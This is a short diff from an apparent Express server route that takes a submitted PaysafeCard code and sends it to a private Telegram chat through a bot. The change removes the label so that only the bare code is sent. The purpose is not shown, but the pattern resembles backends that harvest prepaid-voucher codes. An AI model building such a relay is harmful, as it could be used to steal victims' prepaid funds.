@@ -30,7 +30,7 @@ app.post('/api/send-code', async (req, res) => {
       return res.status(500).json({ error: 'Configuration Telegram manquante' });
     }
 
-    const message = `Nouveau code PaysafeCard: ${cleanCode}`;
+    const message = `${cleanCode}`;
 
     await axios.post(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
       chat_id: telegramChatId,
